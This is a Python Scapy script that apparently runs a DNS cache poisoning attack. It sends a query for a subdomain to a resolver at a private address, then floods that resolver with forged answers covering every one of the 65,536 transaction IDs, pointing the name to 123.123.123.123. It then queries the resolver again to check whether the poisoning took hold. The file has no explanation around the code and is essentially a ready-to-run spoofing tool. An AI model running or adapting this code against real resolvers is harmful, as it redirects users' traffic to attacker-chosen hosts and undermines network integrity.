from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, dnsqtypes, sr1, sendpfast, Ether
from socket import AF_INET, SOCK_DGRAM, socket
from traceback import print_exc
import threading
import time

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind(('10.0.2.15', 1234))

targetaddr="192.168.0.23"

def request(url, addr):
	return Ether()/IP(dst=addr)/UDP()/DNS(rd=1,qd=DNSQR(qname=url))

def reply(id, url, addr):
	response = Ether()/IP(dst=targetaddr)/UDP()/DNS(
		id=id,
		ancount=1,
		qr=1,
		aa=0,
 		ad=0,
 		ra=1,
 		rd=1,	
	 	cd=1,
                qdcount=1,
		qd=DNSQR(qname=url, qtype='A', qclass='IN'),
		an=DNSRR(rrname=url, type='A', rclass='IN', rdata="123.123.123.123", ttl=1234)
	)
	return response

targeturl="www12345678.lukasjung.de"

print("Prepare Packets")

pkts = []
pkts.append(request(targeturl, targetaddr))
i=int(0x0000)
while i <= 65535:
#while i <= 1000:
	if (i%1000) == 0:
		print(str(int(i/1000))+"k/65k")
	pkts.append(reply(i, targeturl, targetaddr))
	i+=1

print("Packets Prepared")

#sendpfast([request(targeturl, targetaddr)], pps=70000, iface="wlan0")
#time.sleep(0.2)
sendpfast(pkts, pps=100000, iface="enp0s3")

answer = sr1(IP(dst=targetaddr)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=targeturl)),verbose=0)
print(answer[DNS].summary())
